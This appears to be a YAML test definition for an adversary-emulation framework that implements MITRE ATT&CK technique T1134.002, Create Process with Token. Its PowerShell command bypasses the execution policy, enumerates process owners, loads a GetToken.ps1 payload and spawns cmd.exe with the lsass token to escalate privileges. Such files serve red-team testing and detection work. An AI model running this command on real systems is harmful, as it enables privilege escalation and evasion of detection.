- requirements: []
  name: Soumaia ART Tests - Access Token Manipulation
  description: "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe (requires elevation)"
  tactic: stealth
  technique_id: T1134.002
  technique_name: Create Process with Token
  executors:
  - cleanup: []
    timeout: 60
    platform: windows
    name: psh
    payloads:
    - GetToken.ps1
    parsers: []
    command: Set-ExecutionPolicy -Scope Process Bypass -Force; $owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}; & "$.\GetToken.ps1"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
  id: f5088ac2-9651-5acc-b75a-b200df6acc8f
